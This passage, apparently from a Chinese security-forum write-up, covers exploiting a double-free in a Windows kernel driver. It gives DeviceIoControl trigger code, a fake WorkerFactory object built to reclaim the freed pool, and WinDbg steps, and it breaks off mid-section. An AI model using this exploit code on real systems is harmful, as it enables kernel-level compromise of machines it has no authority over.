
![](https://bbs.kanxue.com/upload/attach/202202/945611_2JB87JEV2YXMS26.png)

综上所以，可得：

```c
static BYTE inbuf2[0x18];
memset(inbuf2, 0, sizeof(inbuf2));
*(ULONG*)(inbuf2) = 1;
*(ULONG*)(inbuf2 + 0x8) = 0x0AAAAAAA;
```

### 3.4 触发漏洞

最后，触发漏洞函数为：

```
DeviceIoControl((HANDLE)s, 0x1207F, (LPVOID)inbuf1, 0x40, NULL, 0, NULL, NULL);
DeviceIoControl((HANDLE)s, 0x120C3, (LPVOID)inbuf2, 0x18, NULL, 0, NULL, NULL);
```

控制码为`0x1207F`的`DeviceIoControl`函数执行之后，会因为地址异常执行`nt!IoFreeMdl`，释放一次指针；控制码为`0x120C3`的`DeviceIoControl`函数执行之后，又会因为异常执行`nt!IoFreeMdl`，再释放一次指针，从而触发漏洞。

# 4、x64平台EXP编写指导

## 4.1 基本思路

调用控制码为`0x1207F`的函数触发异常释放`pool`后，创建一个对象占用这个释放的`pool`，然后再调用控制码为`0x120C3`的函数，触发异常后再次释放这个`pool`，最后再把这个`pool`的数据赋值成假数据，但指向这个`pool`的指针，我们已经能够控制了，具体分析如下。

## 4.1 第一步：构造FakeWorkerFactory

先来看看构造的代码：

```c
const DWORD FakeObjSize = 0x100;
static BYTE FakeWorkerFactory[FakeObjSize];
memset(FakeWorkerFactory, 0, FakeObjSize);

static BYTE ObjHead[0x50] = 
{
0x00,0x00,0x00,0x00,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x16,0x00,0x08,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
};
memcpy(FakeWorkerFactory, ObjHead, 0x50);

static BYTE a[0x18 + 0x4 + 0x4] = 
{
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
 // 18个
0x00,0x00,0x00,0x00,
 // *(_QWORD *)Object + 0x18
0x00,0x00,0x00,0x00
};
PVOID *pFakeObj = (PVOID *)((ULONG_PTR)FakeWorkerFactory + 0x50);
*pFakeObj = a;
printf("object a : = %p\n", a);
printf("pFakeObj = %p\n", pFakeObj);
```

至于为什么这样写，从`4.1.1`节开始说明。

### 4.1.1 windbg确认WorkFactory的大小

`WorkerFactory`占用空间的大小我们跟踪这条链：

`NtCreateWorkerFactory`->`ObpCreateObject`->`ObpAllocateObject`-> `ExAllocatePoolWithTag`。

但是`ObpCreateObject`和`ObpAllocateObject`很多地方都有调用，如果这个时候一步一步通过函数执行过去，很麻烦，而且很容易出错，你会得到错误的大小。调式的时候，可以这样做：

A、首先打两个断点：

```
4: kd> bl
0 e Disable Clear fffff800`0438c8fa 0001 (0001) nt!ObpAllocateObject+0x12a "r rdx;gc"
1 e Disable Clear fffff800`04374b08 0001 (0001) nt!NtCreateWorkerFactory
```

B、然后运行`exp`，程序会断在第1个点的`NtCreateWorkerFactory`。

C、然后继续`g`，

```
1: kd> g
rdx=0000000000000100
rdx=00000000000004f8
rdx=0000000000000068
rdx=00000000000000a8
rdx=00000000000000a8
rdx=0000000000000068
rdx=00000000000000a8
```

第一个`rdx`就是自己申请的`workfactory`的大小`0x100`了。

这就是为什么我们在`3.1.1`要费尽心思构造`pool`为`0x100`的原因。

### 4.1.2 windbg确认WorkFactory的内存数据

你的实验平台如果跟我一样，下面的断点，你可以直接用：
